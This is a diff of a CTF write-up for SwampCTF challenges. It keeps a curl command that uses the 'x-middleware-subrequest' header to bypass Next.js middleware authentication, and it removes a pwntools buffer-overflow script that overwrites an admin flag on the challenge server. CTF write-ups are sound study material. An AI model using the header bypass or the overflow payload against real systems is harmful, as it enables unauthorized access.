@@ -49,7 +49,8 @@ swampCTF{f1l3_r34d_4nd_d3s3r14l1z3_pwn4g3_x7q9z2r5v8}
 
 ### Challenge: SlowAPI 
 ![image](https://github.com/user-attachments/assets/7639e47e-e6fb-4373-9cc0-c5fc4bfc6e2d)
-IT The RECENT NEXT.JS VULNERABILITY!!!!
+
+- IT The RECENT NEXT.JS VULNERABILITY!!!!
 ```curl -H "x-middleware-subrequest: middleware" http://chals.swampctf.com:43611/api/protected/flag```
       
 --------------------------------
@@ -62,33 +63,11 @@ IT The RECENT NEXT.JS VULNERABILITY!!!!
 
 - Solve script
 
-from pwn import *
-
-# Set up connection to the challenge server
-HOST = "chals.swampctf.com"
-PORT = 40004
-
-# Buffer overflow payload
-payload = b"A" * 10 + b"\x01\x00\x00\x00"  # Overwrite is_admin to 1 (true)
-
-# Start interaction
-p = remote(HOST, PORT)
-p.recvuntil(b"please enter your name: ")
-p.sendline(payload)
-
-# Read output to check if admin
-print(p.recv().decode())
-
-# Send "y" to print flag
-p.sendline(b"y")
-
-# Receive and print flag
-print(p.recvall().decode())
-
-# Close connection
-p.close()```
  
 ### Challenge: Beginner Pwn 2
+![image](https://github.com/user-attachments/assets/cc125998-d69a-423d-b5e8-3bdd7eebf32e)
+
+- Solve Script
 
 
 --------------------------------
@@ -97,7 +76,10 @@ p.close()```
 
 ### Challenge: Lost In Translation
 
-![image](https://github.com/user-attachments/assets/fdae0086-7084-4336-8691-f3a0e10d63f2)
+![image](https://github.com/user-attachments/assets/32e32d6b-eee6-4494-8e1c-b35f7c53510a)
+
+After i unzip the file, there is challenge.js and i Copy and paste the challenge.js to this whitespace <a href="https://www.dcode.fr/whitespace-language"</a>
+
 
 
 
